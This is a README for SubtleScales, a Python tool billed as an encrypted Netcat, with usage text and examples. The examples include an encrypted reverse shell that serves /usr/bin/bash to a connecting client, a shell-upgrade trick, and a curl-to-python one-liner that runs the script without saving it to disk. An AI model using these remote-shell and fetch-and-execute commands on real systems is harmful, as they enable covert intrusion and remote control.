# SubtleScales

SubtleScales: A simple and encrypted version of Netcat written in vanilla Python.

## 1. Usage

```{bash}
subtlescales.py [-h] [-a ADDRESS] [-b MAX_BYTES] [-e COMMAND] [-l] [-p PORT] [-r] [-w]

A simple and encrypted version of Netcat written in vanilla Python.

optional arguments:
  -h, --help            show this help message and exit
  -a ADDRESS, --address ADDRESS
                        listener's IP address, ignored when -l is specified
  -b MAX_BYTES, --max-bytes MAX_BYTES
                        maximum number of bytes to process at once, defaults to 1024
  -e COMMAND, --execute COMMAND
                        execute a command locally and transmit over an encrypted channel, requires -l
  -l, --listen          listen for incoming connections
  -p PORT, --port PORT  port to connect to or listen from, defaults to 8443
  -r, --read-only       read-only mode, only receive incoming data, invalid when -e is specified
  -w, --write-only      write-only mode, dont't expect incoming data
```

**Note**: It is possible to use without saving to disk as follows:

```{bash}
SubtleScales=$(curl -s https://raw.githubusercontent.com/rafagarci/subtlescales/main/subtlescales.py)
python -c "$SubtleScales" OPTIONS
```

## 2. Examples

### 2.1 Sending Files Through an Encrypted Channel

#### 2.1.1 Server

```{bash}
python3 subtlescales.py -rl > received_file
```

#### 2.1.2 Client

```{bash}
cat sent_file | python3 subtlescales.py -wa SERVER_IP_ADDRESS
```

### 2.2 Encrypted Reverse Shell

#### 2.2.1 Server

```{bash}
python3 subtlescales.py -b1 -le "/usr/bin/bash"
```

#### 2.2.2 Client

```{bash}
python3 subtlescales.py -b1 -a SERVER_IP_ADDRESS
```

**Note**: Consider running the following in order to have a more natural shell experience.

```{bash}
CTRL + Z
stty raw -echo; fg
```

### 2.3 Basic Encrypted Chat Over a Network

#### 2.3.1 Server

```{bash}
python3 subtlescales.py -l
```

#### 2.3.2 Client

```{bash}
python3 subtlescales.py -a SERVER_IP_ADDRESS
```

## Considerations

- Encryption is based on the **anonymous** `AECDH-AES256-SHA` cipher suite, which limits connections to TLS 1.2.
- The `-e` option might behave unexpectedly depending on the implementation of the executed command.
- Tested on Linux only.
- [Other considerations](https://stackoverflow.com/questions/77788893/how-do-i-create-and-connect-anonymous-dh-tls-sockets-with-python-and-securely-au).

## License

GNU GPLv3 © Rafael García
